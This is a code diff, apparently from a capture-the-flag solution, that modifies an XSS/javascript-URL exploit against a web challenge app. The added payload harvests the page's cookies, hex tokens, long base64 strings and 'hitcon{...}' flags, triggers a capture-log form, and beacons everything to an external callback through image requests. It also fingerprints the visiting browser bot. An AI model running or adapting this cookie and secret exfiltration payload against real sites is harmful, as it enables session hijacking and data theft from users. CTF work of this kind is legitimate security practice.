@@ -13,7 +13,12 @@ function report(event, value = "") {
 }
 function javascriptUrl(event) {
   const endpoint = JSON.stringify(`${callback}?event=${event}&value=`);
-  return "javascript:(()=>{try{fetch(" + endpoint + "+encodeURIComponent(document.documentElement.outerHTML),{mode:'no-cors',credentials:'omit',keepalive:true})}catch(e){};void 0})()";
+  return "javascript:(async()=>{try{" +
+    "const h=document.documentElement.outerHTML;" +
+    "const snapshot=()=>JSON.stringify({cookie:document.cookie,actions:[...new Set(h.match(/[0-9a-f]{42}/g)||[])],bounds:[...new Set(h.match(/[A-Za-z0-9+/]{120,}={0,2}/g)||[])].slice(0,12),flags:h.match(/hitcon\\{[^}]+\\}/ig)||[]});" +
+    "(new Image).src=" + endpoint + "+encodeURIComponent(snapshot());" +
+    "const f=document.querySelector('.capture-log-toolbar');if(f){f.requestSubmit();await new Promise(r=>setTimeout(r,700));const o=document.querySelector('.capture-log-output');const v=o&&(o.value||o.getAttribute('value'));if(v)(new Image).src=" + endpoint + "+encodeURIComponent('capture.log:'+v)}" +
+    "}catch(e){};void 0})()";
 }
 report("v7-start", JSON.stringify({userAgent:navigator.userAgent, webdriver:navigator.webdriver, referrer:document.referrer, opener:Boolean(window.opener), activation:navigator.userActivation && {active:navigator.userActivation.isActive, hasBeenActive:navigator.userActivation.hasBeenActive}}));
 const settingsWindow = window.open("http://web:3000/settings", "sitepreviewSettings");
